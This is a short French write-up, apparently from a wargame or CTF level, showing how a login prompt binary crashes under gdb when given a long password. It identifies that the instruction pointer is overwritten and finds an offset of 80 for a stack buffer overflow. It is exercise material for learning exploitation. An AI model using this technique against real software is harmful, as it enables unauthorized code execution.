En utilisant gdb on en donnant en mot de passe jusqu'a 100 'a' on peut voir que le programme essaye d'executer du code a l'address 0x61616161 ('a''a''a''a').
```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) bt
#0  0x61616161 in ?? ()
#1  0x0000000a in ?? ()
#2  0xffffd7b4 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```
On en deduit que le register RIP est ecrase par ce qu'on ecrit. On aimerait controller precisement quelle valeur on va mettre dans RIP pour executer le code qu'on veut.

On peut utiliser un outil pour calculer cet offset.
https://wiremask.eu/tools/buffer-overflow-pattern-generator/

Offset: 80
